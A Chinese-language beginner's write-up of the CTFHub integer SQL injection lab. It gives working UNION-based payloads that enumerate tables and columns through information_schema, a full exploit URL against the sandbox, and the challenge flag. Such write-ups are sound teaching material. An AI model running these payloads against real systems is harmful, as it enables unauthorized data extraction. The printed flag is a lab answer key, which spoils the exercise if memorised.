SQL整数型注入 - CTFHub Web 入门 Writeup

2026年9月17日 CTFHub Web安全 SQL注入 整数型注入

这是我第一次接触 SQL 注入。刚开始我完全没懂逻辑，看着屏幕上的数字莫名其妙就变成了 Flag。这篇 Writeup 记录了我从“一脸懵”到“彻底搞懂每一步为什么这么执行”的完整心路历程。

一、大白话解释：什么是 SQL 注入？

想象你去餐厅点餐，原本你只应该报菜名（比如“1号套餐”）。但如果你在菜单上写“1号套餐，顺便把收银台的密码给我”，厨师（后台数据库）如果傻傻照做，把密码和套餐一起端上来，这就是 SQL 注入。

本质： 原本应该被当成“数据”的输入，被后台当成了“指令”执行了。整数型注入，就是因为后台代码写的是 WHERE id = 1（没加引号包裹），我们可以直接拼接 SQL 语句。

二、解题步骤：每一步为什么这么执行？

1. 判断字段数（列数）

输入 1，页面回显了后台语句：select * from news where id=1。

我们构造 1 order by 2。原理是：用 order by 按第 N 列排序，如果第 N 列不存在，页面就会报错。测试出只有 2 列，这是为了后续联合查询做准备。

2. 确定回显位置

输入：-1 union select 1, 2

  • 为什么用 -1？ 因为数据库里没有 id=-1 的新闻，前面的查询结果为空，页面就只能被迫显示我们联合查询注入的 1, 2。
  • 页面显示 ID: 1, Data: 2，说明第 2 列（Data）是我们能控制的“话筒”（回显位）。

3. 利用 information_schema 库获取信息

MySQL 自带一个叫 information_schema 的“系统数据库”，里面藏着所有表和列的目录。

  • 查库名： -1 union select 1, database()（假设回显为 sqli）。
  • 查表名： -1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'（回显出表名 flag）。
  • 查列名： -1 union select 1, group_concat(column_name) from information_schema.columns where table_name='flag'（确认列名为 flag）。

4. 精准拿取 Flag

万事俱备，直接告诉数据库：“去 flag 表，把 flag 列的数据给我！”

-1 union select 1, flag from flag

在浏览器地址栏拼接 URL（注意空格转义为 +，逗号转义为 %2C）：

http://challenge-a0b2f463b7c10303.sandbox.ctfhub.com:10800/?id=-1+union+select+1%2C+flag+from+flag

页面直接回显了最终的 Flag！

最终 Flag： ctfhub{09d55df080a868225c9d2385}

三、核心踩坑与总结

💡 不要直接猜表名： 一开始想直接查 flag 表，结果报错。正确的做法是先查 information_schema.tables 确认表名，再查 columns 确认列名，最后去查数据。

💡 URL 编码小坑： 在浏览器地址栏直接拼 SQL 语句时，如果不把空格换成 +，SQL 语法会解析失败导致 404。

💡 SQL 注入的本质： 不是“偷密码”，而是“劫持服务器大脑”，让数据库执行了我们精心构造的查询指令。
